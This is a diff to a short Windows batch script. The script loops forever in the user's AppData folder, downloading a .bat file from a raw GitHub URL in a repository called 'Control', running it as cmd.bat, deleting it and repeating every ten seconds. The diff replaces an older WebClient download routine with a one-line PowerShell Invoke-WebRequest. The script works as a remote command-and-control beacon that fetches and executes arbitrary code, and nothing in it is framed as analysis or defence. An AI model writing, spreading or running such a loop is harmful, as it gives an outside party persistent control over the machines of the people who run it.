@@ -1,25 +1,7 @@
 cd C:\users\%username%\AppData
 :begin
-Set "url=https://raw.githubusercontent.com/Guest257351/Control/main/REPtxt.bat"
-for %%# in (%url%) do ( set "File=%tmp%\%%~n#.txt" )
-Call :Download "%url%" "%File%"
-If exist "%File%" ( 
-    ( Type "%File%")>con
-( Type "%File%" >cmd.bat)
-)
+Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Control/main/REPtxt.bat").Content >cmd.bat
 call cmd.bat
 del cmd.bat
-timeout 10 /NOBREAK >nul
-goto begin
-
-
-:Download <url> <File>
-Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('%1','%2')" >error.txt
->nul find "At" error.txt && (
-  goto offline
-) || (
-  exit /b
-)
-:offline
 timeout 10 /NOBREAK >nul
 goto begin
